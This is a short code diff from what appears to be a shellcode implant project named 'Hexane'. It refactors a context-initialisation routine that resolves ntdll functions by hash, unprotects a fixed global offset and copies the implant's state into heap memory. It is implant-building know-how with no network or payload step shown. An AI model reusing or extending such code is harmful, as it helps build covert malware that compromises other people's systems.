@@ -44,11 +44,11 @@ namespace Memory {
     namespace Context {
 
         BOOL ContextInit() {
-            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
             HEXANE;
 
+            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
             _hexane instance = { };
-            void *region     = { };
+            void *global     = { };
 
 			SIZE_T size   = sizeof(void*);
 			ULONG protect = 0;
@@ -66,20 +66,21 @@ namespace Memory {
 
             F_PTR_HMOD(instance.win32.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
             F_PTR_HMOD(instance.win32.NtProtectVirtualMemory, instance.modules.ntdll, NTPROTECTVIRTUALMEMORY);
+
             if (!instance.win32.RtlAllocateHeap || !instance.win32.NtProtectVirtualMemory) {
                 return false;
             }
 
-            region = RVA(PBYTE, instance.base.address, &__instance);
+            global = (LPVOID) GLOBAL_OFFSET;
 
-			if (!NT_SUCCESS(instance.win32.NtProtectVirtualMemory(NtCurrentProcess(), &region, &size, PAGE_READWRITE, &protect)) ||
-				!(C_DREF(region) = instance.win32.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
+			if (!NT_SUCCESS(instance.win32.NtProtectVirtualMemory(NtCurrentProcess(), &global, &size, PAGE_READWRITE, &protect)) ||
+				!(C_DREF(global) = instance.win32.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                 return false;
             }
 
-            MemCopy(C_DREF(region), &instance, sizeof(_hexane));
+            MemCopy(C_DREF(global), &instance, sizeof(_hexane));
             MemSet(&instance, 0, sizeof(_hexane));
-            MemSet(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xe);
+            MemSet((PBYTE) global + sizeof(LPVOID), 0, 0xe);
 
             return true;
         }
